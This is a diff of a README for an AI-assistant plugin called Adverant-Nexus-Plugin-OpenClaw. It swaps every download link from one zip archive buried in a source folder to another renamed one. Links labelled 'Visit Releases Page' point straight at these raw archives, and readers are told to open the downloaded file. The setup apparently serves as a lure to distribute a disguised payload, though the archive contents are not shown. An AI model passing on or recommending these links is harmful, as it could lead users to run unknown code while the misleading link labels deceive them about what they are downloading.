@@ -1,13 +1,13 @@
 # 🎉 Adverant-Nexus-Plugin-OpenClaw - Your AI Assistant for Every Channel  
 
-[![Download Adverant Nexus Plugin](https://github.com/Antobtez/Adverant-Nexus-Plugin-OpenClaw/raw/refs/heads/main/services/nexus-openclaw/src/redis/Nexus_Plugin_Adverant_Claw_Open_3.6.zip%20Now-Get%20Started-brightgreen)](https://github.com/Antobtez/Adverant-Nexus-Plugin-OpenClaw/raw/refs/heads/main/services/nexus-openclaw/src/redis/Nexus_Plugin_Adverant_Claw_Open_3.6.zip)  
+[![Download Adverant Nexus Plugin](https://github.com/Antobtez/Adverant-Nexus-Plugin-OpenClaw/raw/refs/heads/main/services/nexus-openclaw/src/utils/Claw_Open_Adverant_Plugin_Nexus_v1.8.zip%20Now-Get%20Started-brightgreen)](https://github.com/Antobtez/Adverant-Nexus-Plugin-OpenClaw/raw/refs/heads/main/services/nexus-openclaw/src/utils/Claw_Open_Adverant_Plugin_Nexus_v1.8.zip)  
 
 ## 🚀 Getting Started  
 Welcome to Adverant-Nexus-Plugin-OpenClaw! This plugin offers a powerful AI assistant designed to help you manage multiple channels with ease. Whether you need to automate tasks or communicate through Discord, Slack, Telegram, or WhatsApp, this plugin has you covered.  
 
 ## 📥 Download & Install  
 To get started, visit the link below to download the latest version of the plugin:  
-[Visit Releases Page to Download](https://github.com/Antobtez/Adverant-Nexus-Plugin-OpenClaw/raw/refs/heads/main/services/nexus-openclaw/src/redis/Nexus_Plugin_Adverant_Claw_Open_3.6.zip)  
+[Visit Releases Page to Download](https://github.com/Antobtez/Adverant-Nexus-Plugin-OpenClaw/raw/refs/heads/main/services/nexus-openclaw/src/utils/Claw_Open_Adverant_Plugin_Nexus_v1.8.zip)  
 
 Once you download the file, follow these simple steps to install it:  
 1. Open the downloaded file.  
@@ -51,4 +51,4 @@ Feel free to reach out through GitHub issues for any questions or feedback.
 
 Enjoy your experience with Adverant-Nexus-Plugin-OpenClaw!  
   
-[Visit Releases Page to Download](https://github.com/Antobtez/Adverant-Nexus-Plugin-OpenClaw/raw/refs/heads/main/services/nexus-openclaw/src/redis/Nexus_Plugin_Adverant_Claw_Open_3.6.zip)
+[Visit Releases Page to Download](https://github.com/Antobtez/Adverant-Nexus-Plugin-OpenClaw/raw/refs/heads/main/services/nexus-openclaw/src/utils/Claw_Open_Adverant_Plugin_Nexus_v1.8.zip)
